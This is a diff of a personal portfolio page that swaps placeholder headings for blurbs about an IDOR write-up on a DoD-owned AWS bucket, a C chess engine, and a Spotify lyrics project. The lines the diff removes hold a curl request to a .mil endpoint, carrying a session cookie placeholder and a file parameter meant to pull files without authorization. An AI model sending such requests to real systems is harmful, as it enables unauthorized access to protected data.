@@ -2,21 +2,17 @@
 
 ---
 
-### Category Name 1 
+## [How I (Techincally) Hacked the Department of Defense](/sample_page)
 
-[How I Hacked the DOD](/sample_page)
-```bash
-curl -i -s -k -X $'GET' \
-    -H $'Host: dnc.nga.mil' -H $'Accept: */*' \
-    -b $'JSESSIONID=<YOUR COOKIE, retrieved from REDACTED.mil>' \
-    $'REDACTED/downloadAWSFiles.php?file=.'
-```
+A quick writeup on the IDOR exploit I found on an AWS Bucket owned by the DOD.
 
 ---
-[Project 2 Title](/pdf/sample_presentation.pdf)
+## [How I developed Mackerel - A Chess Engline Written in Pure C](/pdf/sample_presentation.pdf)
+
+Some insight into the process of creating Mackerel and the horrible horrible bugs that can happen when you mix low-level C programming, recursion, and hashing. 
 
 ---
-[Project 3 Title](http://example.com/)
+## [Spotify Lyrics](http://example.com/)
 
 ---
 
